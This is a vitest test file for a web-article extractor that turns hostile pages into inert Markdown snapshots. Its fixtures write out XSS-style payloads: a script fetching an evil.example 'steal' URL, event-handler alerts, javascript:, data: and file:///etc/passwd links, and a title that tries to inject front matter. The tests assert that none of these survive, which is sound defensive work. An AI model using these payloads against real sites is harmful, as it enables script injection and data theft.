import { beforeEach, describe, expect, it } from 'vitest';
import { InterleafError } from '@shared/errors/interleaf-error';
import {
  articleExtractorState,
  extractArticleInWorker,
  extractionTimeoutMs,
} from '@main/workers/article-extract-worker';
import { renderArticleMarkdown, articleTitle, normalizeTitleForComparison } from '@main/library/article-markdown';
import { extractedArticleSchema, type ExtractedArticle } from '@main/library/article-content';
import { safeWebArticleError } from '@main/library/web-article-import';

/**
 * Extraction and rendering tests for hostile pages.
 *
 * These run the real worker on the real non-executing DOM, because the claim
 * under test is that nothing in an attacker-authored page survives the trip to
 * disk — not that a mock said so. Every fixture is markup a hostile page could
 * plausibly serve, and the assertions are about what is *absent* from the
 * snapshot as much as what is present.
 */

const BASE_URL = 'https://example.com/posts/article';

/** Enough prose to clear the minimum-article threshold in every fixture. */
const FILLER = [
  'The margin of a page is where a reader argues with the author, and this paragraph',
  'exists so the extraction heuristics have a genuine article body to score rather',
  'than a fragment. It is long enough to pass the readable-text threshold on its own,',
  'and it contains commas, which the scoring pass treats as evidence of prose.',
].join(' ');

function page(body: string, head = ''): string {
  return `<!doctype html><html><head><meta charset="utf-8">${head}</head><body>${body}</body></html>`;
}

function articleBody(inner: string): string {
  return `<article class="post-content"><p>${FILLER}</p>${inner}</article>`;
}

async function snapshot(html: string): Promise<{ article: ExtractedArticle; markdown: string }> {
  const article = await extractArticleInWorker(html, BASE_URL);
  const markdown = renderArticleMarkdown({
    article,
    sourceUrl: BASE_URL,
    fallbackTitle: 'Untitled article',
  });
  return { article, markdown };
}

async function expectFailure(html: string, code: string): Promise<InterleafError> {
  let thrown: InterleafError | null = null;
  try {
    await extractArticleInWorker(html, BASE_URL);
  } catch (error) {
    if (!(error instanceof InterleafError)) throw error;
    thrown = error;
  }
  expect(thrown).toBeInstanceOf(InterleafError);
  const error = thrown!;
  expect(error.code).toBe(code);
  return error;
}

describe('web article extraction', () => {
  describe('malicious markup', () => {
    it('produces a snapshot with no executable or remote content', async () => {
      const { markdown } = await snapshot(
        page(
          articleBody(`
            <script>fetch('https://evil.example/steal')</script>
            <script type="application/json">{"a":1}</script>
            <noscript><img src="https://evil.example/pixel.gif"></noscript>
            <style>body{background:url(https://evil.example/bg.png)}</style>
            <iframe src="https://evil.example/frame"></iframe>
            <object data="https://evil.example/o"></object>
            <embed src="https://evil.example/e">
            <form action="https://evil.example/post"><input name="a"><button>Go</button></form>
            <img src="https://evil.example/tracker.gif" alt="tracking pixel">
            <svg onload="alert(1)"><use href="https://evil.example/s"/></svg>
            <video src="https://evil.example/v.mp4"></video>
            <audio src="https://evil.example/a.mp3"><source src="https://evil.example/a.ogg"><track src="https://evil.example/a.vtt"></audio>
            <canvas data-program="interactive">Canvas fallback</canvas>
            <p onclick="alert(1)" onmouseover="alert(2)">Visible prose stays.</p>
          `)
        )
      );

      for (const forbidden of [
        '<script',
        '<iframe',
        '<style',
        '<form',
        '<img',
        '<svg',
        '<object',
        '<embed',
        '<video',
        '<audio',
        '<source',
        '<track',
        '<canvas',
        'onload',
        'onclick',
        'onmouseover',
        'evil.example',
        'fetch(',
        'alert(',
      ]) {
        expect(markdown, `snapshot must not contain ${forbidden}`).not.toContain(forbidden);
      }
      expect(markdown).toContain('Visible prose stays.');
    });

    it('keeps http and https links but drops every other URL scheme', async () => {
      const { markdown } = await snapshot(
        page(
          articleBody(`
            <p><a href="https://good.example/one">safe https</a></p>
            <p><a href="http://good.example/two">safe http</a></p>
            <p><a href="/relative/three">relative link</a></p>
            <p><a href="javascript:alert(1)">script link</a></p>
            <p><a href="data:text/html;base64,PHNjcmlwdD4=">data link</a></p>
            <p><a href="file:///etc/passwd">file link</a></p>
            <p><a href="vbscript:msgbox(1)">vbscript link</a></p>
            <p><a href="interleaf-asset://x/y">asset link</a></p>
          `)
        )
      );

      expect(markdown).toContain('[safe https](https://good.example/one)');
      expect(markdown).toContain('[safe http](http://good.example/two)');
      expect(markdown).toContain('[relative link](https://example.com/relative/three)');
      for (const scheme of ['javascript:', 'data:', 'file:', 'vbscript:', 'interleaf-asset:']) {
        expect(markdown, `snapshot must not contain ${scheme}`).not.toContain(scheme);
      }
      // The link text is preserved even when the target is refused, so the
      // reader loses a destination rather than a sentence.
      expect(markdown).toContain('script link');
    });

    it('strips credentials from link targets it does keep', async () => {
      const { markdown } = await snapshot(
        page(articleBody('<p><a href="https://user:pw@good.example/x">creds</a></p>'))
      );
      expect(markdown).toContain('[creds](https://good.example/x)');
      expect(markdown).not.toContain('user:pw');
    });

    it('removes invisible tracking and off-screen text', async () => {
      const { markdown } = await snapshot(
        page(
          articleBody(`
            <p style="display:none">HIDDENDISPLAYNONE</p>
            <p style="visibility:hidden">HIDDENVISIBILITY</p>
            <p style="opacity:0">HIDDENOPACITY</p>
            <p style="font-size:0">HIDDENFONTSIZE</p>
            <p style="text-indent:-9999px">HIDDENOFFSCREEN</p>
            <p style="position:absolute;left:-10000px">HIDDENLEFT</p>
            <p hidden>HIDDENATTRIBUTE</p>
            <p aria-hidden="true">HIDDENARIA</p>
            <p>VISIBLEPROSE</p>
          `)
        )
      );

      for (const marker of [
        'HIDDENDISPLAYNONE',
        'HIDDENVISIBILITY',
        'HIDDENOPACITY',
        'HIDDENFONTSIZE',
        'HIDDENOFFSCREEN',
        'HIDDENLEFT',
        'HIDDENATTRIBUTE',
        'HIDDENARIA',
      ]) {
        expect(markdown, `${marker} must not survive`).not.toContain(marker);
      }
      expect(markdown).toContain('VISIBLEPROSE');
    });

    it('drops navigation, banner, and complementary page furniture', async () => {
      const { markdown } = await snapshot(
        page(`
          <nav><a href="/x">NAVLINK</a></nav>
          <header role="banner">SITEBANNER</header>
          <aside>SIDEBARPROMO</aside>
          ${articleBody('<p>BODYPROSE</p>')}
          <footer>FOOTERLEGAL</footer>
        `)
      );
      for (const marker of ['NAVLINK', 'SITEBANNER', 'SIDEBARPROMO', 'FOOTERLEGAL']) {
        expect(markdown, `${marker} must not survive`).not.toContain(marker);
      }
      expect(markdown).toContain('BODYPROSE');
    });
  });

  describe('hostile metadata', () => {
    it('flattens a title that tries to break out of the front matter', async () => {
      const { markdown } = await snapshot(
        page(articleBody('<p>Body text.</p>'), '<title>Innocent\n---\nsource: "file:///etc/passwd"</title>')
      );

      const lines = markdown.split('\n');
      // Exactly the opening and closing delimiter: the injected `---` did not
      // become a line of its own and could not start a second document.
      expect(lines.filter((line) => line.trim() === '---')).toHaveLength(2);
      // The injected text survives only as characters inside the title value,
      // so it cannot forge a second `source:` key or a clickable target — bare
      // URLs are never autolinked and `<`/`>` are escaped.
      expect(lines.filter((line) => line.startsWith('source:'))).toHaveLength(1);
      expect(lines.find((line) => line.startsWith('title:'))).toContain('file:///etc/passwd');
      expect(markdown).toContain(`source: "${BASE_URL}"`);
    });

    it('strips quotes and control characters from metadata values', async () => {
      const hostile = 'Quote " and \' plus\u0000control\u001f chars';
      const { markdown } = await snapshot(
        page(
          articleBody('<p>Body text.</p>'),
          `<meta property="og:title" content='${hostile}'><meta name="author" content='Bad "Author"'>`
        )
      );
      const titleLine = markdown.split('\n').find((line) => line.startsWith('title:')) ?? '';
      expect(titleLine.match(/"/g)).toHaveLength(2);
      let hasControlChar = false;
      for (let i = 0; i < markdown.length; i++) {
        const code = markdown.charCodeAt(i);
        if ((code >= 0 && code <= 8) || code === 11 || code === 12 || (code >= 14 && code <= 31)) {
          hasControlChar = true;
          break;
        }
      }
      expect(hasControlChar).toBe(false);
      expect(markdown).toContain('author: "Bad Author"');
    });

    it('bounds metadata length', async () => {
      const { article } = await snapshot(
        page(
          articleBody('<p>Body text.</p>'),
          `<meta property="og:title" content="${'T'.repeat(5000)}">` +
            `<meta name="author" content="${'A'.repeat(5000)}">` +
            `<meta property="og:site_name" content="${'S'.repeat(5000)}">`
        )
      );
      expect(article.title?.length).toBeLessThanOrEqual(300);
      expect(article.byline?.length).toBeLessThanOrEqual(200);
      expect(article.siteName?.length).toBeLessThanOrEqual(120);
    });

    it('falls back to the supplied title when the page has none', async () => {
      const article = await extractArticleInWorker(page(articleBody('<p>Body.</p>')), BASE_URL);
      expect(
        articleTitle({ article, sourceUrl: BASE_URL, fallbackTitle: 'Untitled article' })
      ).toBe('Untitled article');
    });
  });

  describe('markdown inertness', () => {
    it('escapes prose that would otherwise become Markdown structure', async () => {
      const { markdown } = await snapshot(
        page(
          articleBody(`
            <p># Not a heading</p>
            <p>- Not a list item</p>
            <p>1. Not an ordered item</p>
            <p>A *star* and _underscore_ and \`tick\` and [bracket] and &lt;tag&gt;</p>
          `)
        )
      );

      expect(markdown).toContain('\\# Not a heading');
      expect(markdown).toContain('\\- Not a list item');
      expect(markdown).toContain('\\1. Not an ordered item');
      expect(markdown).toContain('\\*star\\*');
      expect(markdown).toContain('\\_underscore\\_');
      expect(markdown).toContain('\\<tag\\>');
    });

    it('keeps a link label from closing its own Markdown link', async () => {
      const { markdown } = await snapshot(
        page(
          articleBody(
            '<p><a href="https://good.example/a">label](https://evil.example/x)</a></p>'
          )
        )
      );
      // The bracket in the label is escaped, so the link ends at the target the
      // extractor chose rather than at one the label smuggled in.
      expect(markdown).toContain('[label\\](https://evil.example/x)](https://good.example/a)');
      expect(markdown).not.toMatch(/[^\\]\]\(https:\/\/evil\.example/);
    });

    it('percent-encodes parentheses in a link target', async () => {
      const { markdown } = await snapshot(
        page(articleBody('<p><a href="https://good.example/a(b)c">paren</a></p>'))
      );
      expect(markdown).toContain('[paren](https://good.example/a%28b%29c)');
    });

    it('fences code so its contents cannot escape the block', async () => {
      const { markdown } = await snapshot(
        page(articleBody('<pre><code>```\nnot a fence\n```</code></pre>'))
      );
      expect(markdown).toContain('````');
      expect(markdown).toContain('not a fence');
    });
  });

  describe('preserved structure', () => {
    it('keeps headings, lists, quotes, code, and captions', async () => {
      const { markdown } = await snapshot(
        page(
          articleBody(`
            <h2>Section heading</h2>
            <h3>Sub heading</h3>
            <p>Ordinary <strong>bold</strong> and <em>italic</em> prose.</p>
            <ul><li>First bullet</li><li>Second bullet</li></ul>
            <ol><li>Step one</li><li>Step two</li></ol>
            <blockquote>A quoted claim.</blockquote>
            <pre><code>const answer = 42;</code></pre>
            <figure><figcaption>Chart caption</figcaption></figure>
            <hr>
          `)
        )
      );

      expect(markdown).toContain('## Section heading');
      expect(markdown).toContain('### Sub heading');
      expect(markdown).toContain('**bold**');
      expect(markdown).toContain('*italic*');
      expect(markdown).toContain('- First bullet');
      expect(markdown).toContain('- Second bullet');
      expect(markdown).toContain('1. Step one');
      expect(markdown).toContain('2. Step two');
      expect(markdown).toContain('> A quoted claim.');
      expect(markdown).toContain('const answer = 42;');
      expect(markdown).toContain('*Chart caption*');
      expect(markdown).toContain('***');
    });

    it('opens with front matter and a single level-one title heading', async () => {
      const { markdown } = await snapshot(
        page(articleBody('<p>Body.</p>'), '<title>A Real Article</title><meta property="og:site_name" content="Example Times">')
      );
      expect(markdown.startsWith('---\n')).toBe(true);
      expect(markdown).toContain('title: "A Real Article"');
      expect(markdown).toContain('site: "Example Times"');
      expect(markdown).toContain(`source: "${BASE_URL}"`);
      expect(markdown.split('\n').filter((line) => line.startsWith('# '))).toHaveLength(1);
    });

    it('renders identical bytes for identical input, so re-import deduplicates', async () => {
      const html = page(articleBody('<p>Stable body text for hashing.</p>'), '<title>Stable</title>');
      const first = await snapshot(html);
      const second = await snapshot(html);
      expect(second.markdown).toBe(first.markdown);
      // No capture timestamp or random identifier is written into the file.
      expect(first.markdown).not.toMatch(/\d{4}-\d{2}-\d{2}T/);
    });
  });

  describe('bounds and failures', () => {
    it('refuses a page with no readable article', async () => {
      const error = await expectFailure(page('<div><p>Too short.</p></div>'), 'validation');
      expect(error.message).toContain('could not find an article');
    });

    it('refuses an empty document', async () => {
      await expectFailure('', 'validation');
    });

    it('refuses a page with too many elements', async () => {
      const bloat = '<div><span>x</span></div>'.repeat(31_000);
      const error = await expectFailure(page(articleBody(bloat)), 'validation');
      expect(error.message).toContain('too large or too complex');
    });

    it('stops a page that takes too long to read', async () => {
      let thrown: InterleafError | null = null;
      try {
        await extractArticleInWorker(page(articleBody('<p>Body.</p>')), BASE_URL, {
          timeoutMs: 1,
        });
      } catch (error) {
        if (!(error instanceof InterleafError)) throw error;
        thrown = error;
      }
      expect(thrown).toBeInstanceOf(InterleafError);
      expect(thrown!.message).toContain('too long');
    });

    it('reports a worker crash as an internal failure that never reaches the user verbatim', async () => {
      let thrown: InterleafError | null = null;
      try {
        await extractArticleInWorker(page(articleBody('<p>Body.</p>')), BASE_URL, {
          testWorkerFailure: true,
        });
      } catch (error) {
        if (!(error instanceof InterleafError)) throw error;
        thrown = error;
      }
      expect(thrown).toBeInstanceOf(InterleafError);
      expect(thrown!.code).toBe('internal');
      // The dispatcher only forwards non-internal messages, and the service
      // collapses anything internal to one generic sentence.
      const safe = safeWebArticleError(thrown);
      expect(safe.code).toBe('validation');
      expect(safe.message).toBe('Interleaf could not import that page safely.');
    });

    it('passes a deliberate typed failure through unchanged', () => {
      const typed = new InterleafError('security-violation', 'That site resolves to a private address.');
      expect(safeWebArticleError(typed)).toBe(typed);
    });

    it('collapses an unexpected non-Interleaf error', () => {
      const safe = safeWebArticleError(new Error('ENOENT: /Users/someone/secret/path'));
      expect(safe.message).toBe('Interleaf could not import that page safely.');
      expect(safe.message).not.toContain('/Users/someone');
    });
  });

  describe('over-complex content budgets', () => {
    it('fails with a safe error when inline budget is exceeded rather than silently truncating', async () => {
      const manyInlines = Array.from({ length: 450 }, (_, i) => `<a href="https://example.com/${String(i)}">link${String(i)}</a> `).join('');
      const html = page(articleBody(`<p>${manyInlines}</p>`));
      const error = await expectFailure(html, 'validation');
      expect(error.message).toContain('too complex');
    });

    it('fails with a safe error when list item budget is exceeded rather than silently truncating', async () => {
      const manyItems = Array.from({ length: 550 }, (_, i) => `<li>Item ${String(i)}</li>`).join('');
      const html = page(articleBody(`<ul>${manyItems}</ul>`));
      const error = await expectFailure(html, 'validation');
      expect(error.message).toContain('too complex');
    });
    it('fails with a safe error when nesting depth budget is exceeded', async () => {
      let nested = '<p>Deeply nested text.</p>';
      for (let i = 0; i < 40; i++) {
        nested = `<div><p>Step ${String(i)}</p>${nested}</div>`;
      }
      const html = page(articleBody(nested));
      const error = await expectFailure(html, 'validation');
      expect(error.message).toContain('too complex');
    });
  });

  describe('inert intermediate representation link safety', () => {
    it('rejects malicious or credentialed link hrefs in extractedArticleSchema', () => {
      const baseArticle = {
        title: 'Title',
        byline: null,
        siteName: null,
        textLength: 100,
      };

      for (const dangerousHref of [
        'javascript:alert(1)',
        'file:///etc/passwd',
        'data:text/html,malicious',
        'blob:https://example.com/uuid',
        'vbscript:msgbox(1)',
        'https://user:password@example.com',
        'ftp://example.com/file',
      ]) {
        const result = extractedArticleSchema.safeParse({
          ...baseArticle,
          blocks: [
            {
              type: 'paragraph',
              inline: [{ text: 'Click', style: 'plain', href: dangerousHref }],
            },
          ],
        });
        expect(result.success, `${dangerousHref} must be rejected by schema`).toBe(false);
      }
    });

    it('renders malicious inlines as inert plain text in renderArticleMarkdown', () => {
      const rendered = renderArticleMarkdown({
        article: {
          title: 'Title',
          byline: null,
          siteName: null,
          textLength: 50,
          blocks: [
            {
              type: 'paragraph',
              inline: [
                { text: 'Safe link', style: 'plain', href: 'https://example.com/good' },
                { text: ' ', style: 'plain' },
                { text: 'Dangerous link', style: 'plain', href: 'javascript:alert(1)' },
              ],
            },
          ],
        },
        sourceUrl: 'https://example.com/article',
        fallbackTitle: 'Fallback',
      });

      expect(rendered).toContain('[Safe link](https://example.com/good)');
      expect(rendered).toContain('Dangerous link');
      expect(rendered).not.toContain('javascript:alert(1)');
      expect(rendered).not.toContain('[Dangerous link]');
    });
  });

  describe('cancellation and worker lifecycle', () => {
    /** Waits until the extractor's bookkeeping satisfies `check`, or gives up. */
    async function waitForState(
      check: (state: ReturnType<typeof articleExtractorState>) => boolean
    ): Promise<ReturnType<typeof articleExtractorState>> {
      for (let attempt = 0; attempt < 200; attempt += 1) {
        const state = articleExtractorState();
        if (check(state)) return state;
        await new Promise((resolve) => setTimeout(resolve, 10));
      }
      return articleExtractorState();
    }

    /** A worker that never replies, so only cancellation can end it. */
    function hang(signal: AbortSignal): Promise<ExtractedArticle> {
      return extractArticleInWorker(page(articleBody('<p>Body.</p>')), BASE_URL, {
        testWorkerHang: true,
        timeoutMs: 15_000,
        signal,
      });
    }

    // `terminate()` resolves asynchronously, so a worker from the previous case
    // can still be shutting down. Each case starts from a genuinely idle
    // extractor rather than inheriting one.
    beforeEach(async () => {
      const idle = await waitForState(
        (state) => state.active === 0 && state.queued === 0 && state.workers === 0
      );
      expect(idle).toEqual({ active: 0, queued: 0, workers: 0 });
    });

    it('terminates the worker when the caller cancels mid-extraction', async () => {
      const controller = new AbortController();
      const pending = hang(controller.signal);
      await waitForState((state) => state.workers === 1);

      controller.abort();
      await expect(pending).rejects.toThrow(/cancelled/i);

      const settled = await waitForState((state) => state.workers === 0 && state.active === 0);
      expect(settled).toEqual({ active: 0, queued: 0, workers: 0 });
    });

    it('removes a queued job before it starts and never runs it', async () => {
      // Both slots go to workers that will not finish on their own.
      const firstController = new AbortController();
      const secondController = new AbortController();
      const first = hang(firstController.signal);
      const second = hang(secondController.signal);
      await waitForState((state) => state.workers === 2);

      const queuedController = new AbortController();
      const queued = hang(queuedController.signal);
      const saturated = await waitForState((state) => state.queued === 1);
      expect(saturated.active).toBe(2);
      expect(saturated.workers).toBe(2);

      queuedController.abort();
      await expect(queued).rejects.toThrow(/cancelled/i);

      // The cancelled job left the queue without ever starting a third worker.
      const afterCancel = articleExtractorState();
      expect(afterCancel.queued).toBe(0);
      expect(afterCancel.workers).toBe(2);

      firstController.abort();
      secondController.abort();
      await expect(first).rejects.toThrow(/cancelled/i);
      await expect(second).rejects.toThrow(/cancelled/i);

      // Freeing the slots must not start the job that was already cancelled.
      const drained = await waitForState((state) => state.workers === 0 && state.active === 0);
      expect(drained).toEqual({ active: 0, queued: 0, workers: 0 });
    });

    it('refuses a job whose signal is already aborted without taking a slot', async () => {
      const controller = new AbortController();
      controller.abort();
      await expect(hang(controller.signal)).rejects.toThrow(/cancelled/i);
      expect(articleExtractorState()).toEqual({ active: 0, queued: 0, workers: 0 });
    });

    it('terminates a worker that outlives its deadline', async () => {
      await expect(
        extractArticleInWorker(page(articleBody('<p>Body.</p>')), BASE_URL, {
          testWorkerHang: true,
          timeoutMs: 30,
        })
      ).rejects.toThrow(/too long/);

      const settled = await waitForState((state) => state.workers === 0 && state.active === 0);
      expect(settled).toEqual({ active: 0, queued: 0, workers: 0 });
    });

    it('never lets a caller extend the extraction budget past the module cap', () => {
      // A caller may tighten the budget and never loosen it, so an upstream
      // deadline that is wrong, absurd, or hostile cannot pin a worker open.
      const ceiling = extractionTimeoutMs(undefined);
      expect(ceiling).toBeGreaterThan(0);
      expect(extractionTimeoutMs(50)).toBe(50);
      expect(extractionTimeoutMs(ceiling + 1)).toBe(ceiling);
      expect(extractionTimeoutMs(60 * 60 * 1000)).toBe(ceiling);
      expect(extractionTimeoutMs(Number.POSITIVE_INFINITY)).toBe(ceiling);
      expect(extractionTimeoutMs(Number.NaN)).toBe(ceiling);
      expect(extractionTimeoutMs(0)).toBe(1);
      expect(extractionTimeoutMs(-5_000)).toBe(1);
    });
  });

  describe('title deduplication and typography normalization', () => {
    it('normalizes typographic differences when matching first heading against title', () => {
      const variations = [
        { title: "Reader's Guide", heading: 'Reader’s Guide' },
        { title: "Reader's Guide", heading: 'Readers Guide' },
        { title: 'Reader’s Guide', heading: 'Readerʼs Guide' },
        { title: "Reader's Guide", heading: 'Reader＇s Guide' },
        { title: "Reader's Guide", heading: '“Reader’s Guide”' },
        { title: "Reader's Guide", heading: "Reader's Guide—" },
        // A zero-width space (U+200B) the reader can never see.
        { title: "Reader's Guide", heading: 'Reader\u200Bs Guide' },
        { title: '"Quoted Title"', heading: '“Quoted Title”' },
        { title: 'Title — An Em-Dash', heading: 'Title - An Em-Dash' },
        { title: 'Title With   Extra   Spaces', heading: 'Title With Extra Spaces' },
        { title: 'Title with period.', heading: 'Title with period' },
        { title: 'Part 1: Beginning', heading: 'Part 1 Beginning' },
        { title: 'Ünicode Título', heading: 'ünicode título!' },
      ];

      for (const { title, heading } of variations) {
        expect(
          normalizeTitleForComparison(title),
          `normalizeTitleForComparison should match for "${title}" and "${heading}"`
        ).toBe(normalizeTitleForComparison(heading));

        const markdown = renderArticleMarkdown({
          article: {
            title,
            byline: null,
            siteName: null,
            textLength: 100,
            blocks: [
              {
                type: 'heading',
                level: 1,
                inline: [{ text: heading, style: 'plain' }],
              },
              {
                type: 'paragraph',
                inline: [{ text: 'Article content.', style: 'plain' }],
              },
            ],
          },
          sourceUrl: 'https://example.com/article',
          fallbackTitle: 'Fallback',
        });

        // The metadata title is preserved in the # heading:
        const expectedTitle = articleTitle({
          article: { title, byline: null, siteName: null, blocks: [], textLength: 0 },
          sourceUrl: 'https://example.com/article',
          fallbackTitle: 'Fallback',
        });
        expect(markdown).toContain(`# ${expectedTitle}`);
        // The duplicate body heading is removed because it matches after normalization:
        const headingOccurrences = (markdown.match(/^#+ .+/gm) ?? []).length;
        expect(headingOccurrences, `Heading must appear exactly once in document`).toBe(1);
        expect(markdown).toContain('Article content.');
      }
    });

    it('preserves first heading when it differs from document title', () => {
      const markdown = renderArticleMarkdown({
        article: {
          title: 'Document Title',
          byline: null,
          siteName: null,
          textLength: 100,
          blocks: [
            {
              type: 'heading',
              level: 2,
              inline: [{ text: 'Section One: Background', style: 'plain' }],
            },
            {
              type: 'paragraph',
              inline: [{ text: 'Article content.', style: 'plain' }],
            },
          ],
        },
        sourceUrl: 'https://example.com/article',
        fallbackTitle: 'Fallback',
      });

      expect(markdown).toContain('# Document Title');
      expect(markdown).toContain('## Section One: Background');
      expect(markdown).toContain('Article content.');
    });

    it('keeps headings that differ by more than typography', () => {
      // The normalizer folds punctuation hard, so these guard the other
      // direction: two headings that a reader would call different must stay
      // different, or a real section would silently vanish from the snapshot.
      const distinct = [
        { title: 'Part 1: Beginning', heading: 'Part 2: Beginning' },
        { title: "Reader's Guide", heading: "Writer's Guide" },
        { title: 'Reader Guide', heading: 'Reader Guides' },
        { title: 'C++ Notes', heading: 'C Notes 2' },
      ];

      for (const { title, heading } of distinct) {
        expect(
          normalizeTitleForComparison(title),
          `"${title}" and "${heading}" must not normalize alike`
        ).not.toBe(normalizeTitleForComparison(heading));
      }
    });

    it('does not drop a heading when the title normalizes to nothing', () => {
      // A title made only of punctuation normalizes to the empty string, which
      // an empty or punctuation-only heading would otherwise "match".
      const markdown = renderArticleMarkdown({
        article: {
          title: '---',
          byline: null,
          siteName: null,
          textLength: 100,
          blocks: [
            { type: 'heading', level: 1, inline: [{ text: '???', style: 'plain' }] },
            { type: 'paragraph', inline: [{ text: 'Article content.', style: 'plain' }] },
          ],
        },
        sourceUrl: 'https://example.com/article',
        fallbackTitle: 'Fallback',
      });

      expect(markdown).toContain('# ---');
      expect(markdown).toContain('# ???');
      expect(markdown).toContain('Article content.');
    });

    it('deduplicates a curly-apostrophe heading through the real extractor', async () => {
      // The same claim as above, but end to end: the page states the title with
      // a straight apostrophe and repeats it in the body with a curly one,
      // which is exactly what a real CMS does.
      const { markdown } = await snapshot(
        page(
          `<article class="post-content"><h1>Reader’s Guide</h1><p>${FILLER}</p><p>BODYPROSE</p></article>`,
          "<title>Reader's Guide</title>"
        )
      );

      expect(markdown).toContain("# Reader's Guide");
      expect(markdown).not.toContain('Reader’s Guide');
      expect((markdown.match(/^#+ .+/gm) ?? []).length).toBe(1);
      expect(markdown).toContain('BODYPROSE');
    });
  });
});
